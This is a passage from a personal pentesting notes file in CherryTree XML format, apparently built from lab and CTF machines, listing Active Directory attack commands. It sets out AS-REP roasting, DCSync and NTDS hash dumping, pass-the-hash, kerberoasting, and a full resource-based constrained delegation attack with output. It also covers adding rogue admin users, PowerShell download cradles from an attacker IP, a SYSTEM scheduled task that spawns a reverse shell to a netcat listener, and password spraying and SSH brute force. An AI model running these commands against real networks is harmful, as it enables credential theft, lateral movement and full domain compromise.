### Get  ASREPMessage without pass  
impacket-GetNPUsers spookysec.local/svc-admin -no-pass


or

python3 /opt/impacket/examples/GetNPUsers.py domain.local/admin -request -no-pass -dc-ip 10.10.11.152
</codebox>
          </node>
          <node name="secretdumps-GetAllHashes" unique_id="85" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1689887987">
            <rich_text>
</rich_text>
            <rich_text foreground="#569cd6" weight="heavy">### Dump All password hashes from a user account</rich_text>
            <rich_text> (DC Sync aka synchronizing DC)


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

___________________________________________________________

</rich_text>
            <rich_text scale="h2">Getting All the hashes via ntds.dit files</rich_text>
            <rich_text>

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

ex:


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <codebox char_offset="83" justification="left" frame_width="850" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump -just-dc backup@spookysec.local
or 
impacket-secretsdump domain.local/user@10.10.11.152</codebox>
            <codebox char_offset="190" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump -ntds &lt;ntds.dit&gt; -system &lt;SYSTEM&gt; LOCAL</codebox>
            <codebox char_offset="199" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump -ntds temp/ntds.dit -system temp/SYSTEM LOCAL</codebox>
          </node>
          <node name="psexec - Passthe HAsh" unique_id="86" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690770">
            <rich_text>Exploitation via pass the hash



</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
or


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text foreground="#d4d4d4">or</rich_text>
            <rich_text>


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>


</rich_text>
            <codebox char_offset="34" justification="left" frame_width="1314" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@10.10.11.152 -hashes randomLMHASH:oeasdNTLMHASH
</codebox>
            <codebox char_offset="41" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo python2 psexec.py /administrator:Password123@10.10.11.152 </codebox>
            <codebox char_offset="49" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /administrator:Password123@10.10.11.152</codebox>
          </node>
          <node name="GetADUsers-enumerating Data from users" unique_id="87" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690774">
            <rich_text>
</rich_text>
            <rich_text foreground="#79c0ff" weight="heavy">### This script will gather data about the domain's users and their corresponding email addresses.</rich_text>
            <rich_text>
</rich_text>
            <rich_text foreground="#c9d1d9">```</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
</rich_text>
            <rich_text foreground="#c9d1d9">```</rich_text>
            <rich_text>
or

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
</rich_text>
            <codebox char_offset="104" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">GetADUsers.py domain/user:password@IP
or
impacket-GetADUsers domain/user:password@IP</codebox>
            <codebox char_offset="114" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GETADUsers -all domain.local/user -dc-ip 10.10.11.152</codebox>
          </node>
          <node name="GetUserSPNs - get TGTs" unique_id="88" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690781">
            <rich_text>
</rich_text>
            <rich_text scale="h3">Get TGT for kerberoastable users</rich_text>
            <rich_text>

</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="35" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Impacket-GetUserSPN -request -dc-ip 10.10.11.152 domain.local/user</codebox>
          </node>
          <node name="impacket-addcomputer" unique_id="96" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690042606" ts_lastsave="1690043170">
            <rich_text>
</rich_text>
            <rich_text scale="h3">Resource Based Constrained Delegation</rich_text>
            <rich_text>
&#13;Let's use our access with the </rich_text>
            <rich_text family="monospace">l.livingstone</rich_text>
            <rich_text> account to create a new machine account on the domain. We can do with by using </rich_text>
            <rich_text family="monospace">impacket-addcomputer</rich_text>
            <rich_text>.
&#13;</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
            <rich_text>&#13;We can verify that this machine account was added to the domain by using our </rich_text>
            <rich_text family="monospace">evil-winrm</rich_text>
            <rich_text> session from before.
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>



With this account added, we now need a python script to help us manage the delegation rights. Let's grab a copy of </rich_text>
            <rich_text link="webs https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py">rbcd.py</rich_text>
            <rich_text> and use it to set </rich_text>
            <rich_text family="monospace">msDS-AllowedToActOnBehalfOfOtherIdentity</rich_text>
            <rich_text> on our new machine account.
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
            <rich_text>&#13;We can confirm that this was successful by using our </rich_text>
            <rich_text family="monospace">evil-winrm</rich_text>
            <rich_text> session.
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
            <codebox char_offset="186" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ impacket-addcomputer resourced.local/l.livingstone -dc-ip 10.10.11.152 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'&#13;
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation&#13;
&#13;
[*] Successfully added machine account ATTACK$ with password AttackerPC1!.</codebox>
            <codebox char_offset="299" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; get-adcomputer attack&#13;
&#13;
&#13;
DistinguishedName : CN=ATTACK,CN=Computers,DC=resourced,DC=local&#13;
DNSHostName       :&#13;
Enabled           : True&#13;
Name              : ATTACK&#13;
ObjectClass       : computer&#13;
ObjectGUID        : 3fe60405-3692-4de9-8a20-917b234741b9&#13;
SamAccountName    : ATTACK$&#13;
SID               : S-1-5-21-537427935-490066102-1511301751-3601&#13;
UserPrincipalName :</codebox>
            <codebox char_offset="514" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;┌──(kali㉿kali)-[~]&#13;
└─$ wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py  &#13;
...&#13;
┌──(kali㉿kali)-[~]&#13;
└─$ sudo python3 rbcd.py -dc-ip 192.168.120.181 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone                                  &#13;
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation&#13;
&#13;
[*] Starting Resource Based Constrained Delegation Attack against RESOURCEDC$&#13;
[*] Initializing LDAP connection to 192.168.120.181&#13;
[*] Using resourced\l.livingstone account with password ***&#13;
[*] LDAP bind OK&#13;
[*] Initializing domainDumper()&#13;
[*] Initializing LDAPAttack()&#13;
[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `ATTACK` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`&#13;
[*] Delegation rights modified succesfully!&#13;
[*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy</codebox>
            <codebox char_offset="591" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity&#13;
&#13;
Path Owner                  Access&#13;
---- -----                  ------&#13;
     BUILTIN\Administrators resourced\ATTACK$ Allow</codebox>
          </node>
          <node name="impacket-getST" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690043804" ts_lastsave="1690043838">
            <rich_text>We now need to get the administrator service ticket. We can do this by using </rich_text>
            <rich_text family="monospace">impacket-getST</rich_text>
            <rich_text> with our privileged machine account.
&#13;</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="130" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 10.10.11.152&#13;

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation&#13;
&#13;
[*] Getting TGT for user&#13;
[*] Impersonating Administrator&#13;
[*]     Requesting S4U2self&#13;
[*]     Requesting S4U2Proxy&#13;
[*] Saving ticket in Administrator.ccache&#13;
</codebox>
          </node>
        </node>
        <node name="Pass The Hash Attack" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689619" ts_lastsave="1688335472">
          <rich_text>


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
or


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

with mimikatz
</rich_text>
          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
          <rich_text>

</rich_text>
          <codebox char_offset="3" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.11.152 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</codebox>
          <codebox char_offset="10" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@10.10.11.152 -hashes randomLMHASH:oeasdNTLMHASH</codebox>
        </node>
        <node name="Useful Powershell/CMD Commands" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689661" ts_lastsave="1696728088">
          <rich_text>
</rich_text>
          <rich_text scale="h2">
Setting password for user sophie</rich_text>
          <rich_text>


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


_______________________________________________________

&#13;• </rich_text>
          <rich_text family="monospace">Account Operators</rich_text>
          <rich_text> Group: According to official </rich_text>
          <rich_text link="webs https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-accountoperators">documentation</rich_text>
          <rich_text>, members of the </rich_text>
          <rich_text family="monospace">Account Operators</rich_text>
          <rich_text> group are allowed create and modify users and add them to non-protected groups ( non admin )
&#13;• </rich_text>
          <rich_text family="monospace">WriteDACL</rich_text>
          <rich_text> : The WriteDACL privilege gives a user the ability to add ACLs to an&#13;object. This means that we can add a user to this group and give them </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync">DCSync</rich_text>
          <rich_text> privileges that can be used to abuse and grab credential and then shell via psexec
&#13;



__________________________________________________



</rich_text>
          <rich_text scale="h3">Adding a User </rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
or

</rich_text>
          <rich_text scale="h3">Adding user to Admin  local group</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

Or adding them to any other group

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 or with

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


Then accessing the machine
_________________________________________________________
</rich_text>
          <rich_text scale="h2">curl replacement in Powershell:</rich_text>
          <rich_text>
To downoad files:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

pr
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
or

</rich_text>
          <rich_text family="monospace">$WebClient = New-Object System.Net.WebClient&#13;
$WebClient.DownloadFile("</rich_text>
          <rich_text family="monospace" foreground="#5ebdab">http://10.10.11.152</rich_text>
          <rich_text family="monospace">/navigating-code.exe","C:\navigating-code.exe")&#13;
</rich_text>
          <rich_text>&#13;    
or
&#13;</rich_text>
          <rich_text family="monospace">powershell.exe (New-Object System.Net.WebClient).DownloadFile('</rich_text>
          <rich_text family="monospace" foreground="#5ebdab">http://10.10.11.152</rich_text>
          <rich_text family="monospace">:8080/file.bat','filename.bat')&#13;
</rich_text>
          <rich_text>&#13;    



______________________________


</rich_text>
          <rich_text scale="h2">Force any particular computer to sync its GPOs imm</rich_text>
          <rich_text justification="left" scale="h2"></rich_text>
          <rich_text scale="h2">ediate</rich_text>
          <rich_text>




________________________________


</rich_text>
          <rich_text scale="h2">Use powershell specifically for all the below commands:
</rich_text>
          <rich_text>
</rich_text>
          <rich_text scale="h3">Testing Connection</rich_text>
          <rich_text justification="left" scale="h3"></rich_text>
          <rich_text scale="h3">/Access</rich_text>
          <rich_text>


____________________________________
</rich_text>
          <rich_text scale="h2">CMD</rich_text>
          <rich_text>


</rich_text>
          <rich_text scale="h3">Running as a different user on</rich_text>
          <rich_text justification="left" scale="h3"></rich_text>
          <rich_text scale="h3"> an AD</rich_text>
          <rich_text>




_____________________________________________


</rich_text>
          <rich_text scale="h2">Powershell Remoting</rich_text>
          <rich_text>

allows you to get a Powershell session in the remote machine, listens on 5985 and is enabled by default in the Windows Server machines.
 You can use Powershell Remoting from Windows by using many </rich_text>
          <rich_text link="webs https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.1">CmdLets and parameters</rich_text>
          <rich_text> available in Powershell. From a Linux machine you can use </rich_text>
          <rich_text link="webs https://github.com/Hackplayers/evil-winrm">evil-winrm</rich_text>
          <rich_text>.
 As well as in the RPC/SMB case, you can use a password, a NT hash or a Kerberos ticket to connect to the target machine. With evil-winrm, 
 you can pass them to the application as a parameters or configure the ccache file as in impacket. 
 In case of the Powershell cmdlets, you can use a password directly, but if you have a Kerberos ticket or a NT hash, you will need to inject them by using </rich_text>
          <rich_text link="webs https://github.com/GhostPack/Rubeus">Rubeus</rich_text>
          <rich_text> or </rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz">mimikatz</rich_text>
          <rich_text>.
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text> 
 Ex:
 
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text> 
 or
 
 
 
where ptt is pass the ticket
 
 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>then
 
 
 
 
 </rich_text>
          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
          <rich_text>
 
 </rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="37" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose</codebox>
          <codebox char_offset="606" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net user john1 pass123 /add /domain</codebox>
          <codebox char_offset="647" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net localgroup administrators john1 /add</codebox>
          <codebox char_offset="685" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net group "EXCHANGE WINDOWS PERMISSIONS" john1 /add</codebox>
          <codebox char_offset="697" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net group "Exchange Windows Permissions" john1 /add /domain</codebox>
          <codebox char_offset="837" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Invoke-WebRequest http://10.10.11.152/GMSAPasswordReader.exe -OutFile GMSA.exe</codebox>
          <codebox char_offset="843" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
$wc = New-Object Net.WebClient
$wc.DownloadString("http://10.10.11.152  whatever else u want with space")
</codebox>
          <codebox char_offset="1205" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gpupdate /force</codebox>
          <codebox char_offset="1327" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">Test-NetConnection -ComputerName YouComputerName -Port 389
or

# Test if HTTP port is open
Test-NetConnection google.com -CommonTCPPort "Http"

# Or define a port number
Test-NetConnection google.com -Port 80</codebox>
          <codebox char_offset="1411" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="dosbatch" highlight_brackets="1" show_line_numbers="0">runas /user:corp\server_admin "C:\Windows\system32\notepad.exe C:\ps\region.txt"

or  like ippsec writeup

runas /netonly /user:domain.local\user cmd
</codebox>
          <codebox char_offset="2196" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asktgt /user:Administrator /rc4:b73fdfe10e87b4ca5c0d957f81de6863 /ptt</codebox>
          <codebox char_offset="2206" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mimikatz # kerberos::ptt</codebox>
          <codebox char_offset="2251" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Enter-PSSession -ComputerName dc01</codebox>
          <node name="Getting a Shell from password" unique_id="92" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688943845" ts_lastsave="1688943934">
            <rich_text scale="h2">First, let's restart out Netcat listener.</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text scale="h2">
&#13;Next, we'll spawn a new PowerShell session to install and run our scheduled task using the Administrator user's credentials.</rich_text>
            <rich_text>

&#13;</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
            <rich_text>
</rich_text>
            <rich_text scale="h2">&#13;Once we run the scheduled task (as shown in the final command above), we are presented with a full system shell.</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
            <codebox char_offset="42" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;kali@kali:~$ sudo nc -lvp 445&#13;
listening on [any] 445 ...&#13;
</codebox>
            <codebox char_offset="172" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">c:\windows\system32\inetsrv&gt;powershell&#13;
powershell&#13;
Windows PowerShell &#13;
Copyright (C) Microsoft Corporation. All rights reserved.&#13;
&#13;
PS C:\windows\system32\inetsrv&gt; $pw = ConvertTo-SecureString "T4E@d8!/od@l36" -AsPlainText -Force&#13;
$pw = ConvertTo-SecureString "T4E@d8!/od@l36" -AsPlainText -Force&#13;
PS C:\windows\system32\inetsrv&gt;&#13;
&#13;
PS C:\windows\system32\inetsrv&gt; $creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)&#13;
$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)&#13;
PS C:\windows\system32\inetsrv&gt;&#13;
&#13;
PS C:\windows\system32\inetsrv&gt; Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds&#13;
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds&#13;
SUCCESS: The scheduled task "shell" has successfully been created.&#13;
PS C:\windows\system32\inetsrv&gt;&#13;
&#13;
PS C:\windows\system32\inetsrv&gt; Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds&#13;
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds&#13;
SUCCESS: Attempted to run the scheduled task "shell".&#13;
PS C:\windows\system32\inetsrv&gt;</codebox>
            <codebox char_offset="290" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;kali@kali:~$ nc -lvp 445&#13;
listening on [any] 445 ...&#13;
192.168.120.108: inverse host lookup failed: Unknown host&#13;
connect to [192.168.118.6] from (UNKNOWN) [192.168.120.108] 49731&#13;
Microsoft Windows [Version 10.0.17763.1554]&#13;
(c) 2018 Microsoft Corporation. All rights reserved.&#13;
&#13;
C:\Windows\system32&gt;whoami&#13;
whoami&#13;
nt authority\system</codebox>
          </node>
        </node>
        <node name="CrackMapExec" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689718" ts_lastsave="1689888826">
          <rich_text scale="h3">Enumerating smb via crackmapexec</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


</rich_text>
          <rich_text scale="h3">Enumerating all the shares with a given password</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

 
</rich_text>
          <rich_text scale="h4"> Checking Pass the Hash</rich_text>
          <rich_text>
 
 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 
</rich_text>
          <rich_text scale="h3"> Listing all the shares</rich_text>
          <rich_text>
 
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <rich_text scale="h3">Null Authentication smb Enumeration</rich_text>
          <rich_text>

 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 


</rich_text>
          <rich_text scale="h3">Anonymous Authentication smb Enum</rich_text>
          <rich_text>
 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 
 
</rich_text>
          <rich_text scale="h3">  </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <rich_text scale="h2">Checking if winrm works</rich_text>
          <rich_text>


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

once confirmed simply run:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
  
  
</rich_text>
          <rich_text scale="h2"> Adding Domain with -d</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text> 
</rich_text>
          <rich_text scale="h3"> Checking all the files in the share</rich_text>
          <rich_text>
 
 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 
</rich_text>
          <rich_text scale="h3"> checking usernames and passwords line by line (not using all the passwords for each user)</rich_text>
          <rich_text>
 
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


or chacking all the password and continuing on success:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

____________________________________________________________________-


Grabbing the Laps password

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

______________________________


</rich_text>
          <rich_text scale="h2">SSH Brute Force</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="34" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.11.152</codebox>
          <codebox char_offset="88" justification="left" frame_width="962" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.11.152 -u &lt;username&gt; -p &lt;password&gt; --shares

Ex:

crackmapexec smb 10.10.11.152 -u admin -p abcd1234 --shares</codebox>
          <codebox char_offset="120" justification="left" frame_width="978" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.11.152 -u admin -H reallybighashvalue</codebox>
          <codebox char_offset="150" justification="left" frame_width="610" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> crackmapexec smb 10.10.11.152 --shares
 </codebox>
          <codebox char_offset="190" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.11.152 --shares -u '' -p ''</codebox>
          <codebox char_offset="231" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.11.152 --shares -u 'randomanon' -p ''</codebox>
          <codebox char_offset="239" justification="left" frame_width="978" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.11.152 -u admin -H reallybighashvalue</codebox>
          <codebox char_offset="267" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec winrm 10.10.11.152 -u users.txt -H hashes.txt</codebox>
          <codebox char_offset="297" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.11.152 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808</codebox>
          <codebox char_offset="328" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> Crackmapexec -d domain.local -u username -p password --shares</codebox>
          <codebox char_offset="329" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
</codebox>
          <codebox char_offset="372" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.11.152 -u validuser.txt -p password.txt -M spider-plus </codebox>
          <codebox char_offset="373" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
          <codebox char_offset="470" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">  crackmapexec smb 10.10.11.152  -u validuser.txt -p password.txt -M spider-plus --no-bruteforce</codebox>
          <codebox char_offset="531" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.11.152  -u validuser.txt -p password.txt -M spider-plus --continue-on-success</codebox>
          <codebox char_offset="634" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ldap 10.10.11.152 -u &lt;username&gt; -p &lt;password&gt; --kdcHost 10.10.11.152 -M laps</codebox>
          <codebox char_offset="687" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ssh 10.10.11.152 -u patrick -p /usr/share/wordlists/rockyou.txt</codebox>
        </node>
        <node name="Using Bloodhound" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690408" ts_lastsave="1698807551">
          <rich_text scale="h3">Upload sharphound and run the following if u are on a non domain joined system in powershell</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

For Domain Joined simply run

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


Once Done download the zip file and upload it in bloodhound by dragging and dropping

First always check the pwned users and mark them owned before checking anything else


Once Done download the zip file and upload it in bloodhound by dragging and dropping

First always check the pwned users and mark them owned before checking anything else

____________________________________________________


using Powershell to run sharphound/bloodhound on target machine

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
_______________________________________________


</rich_text>
          <rich_text scale="h3">running bloodhound from attack machine using python</rich_text>
          <rich_text>

First install via
</rich_text>
          <rich_text justification="left"></rich_text>
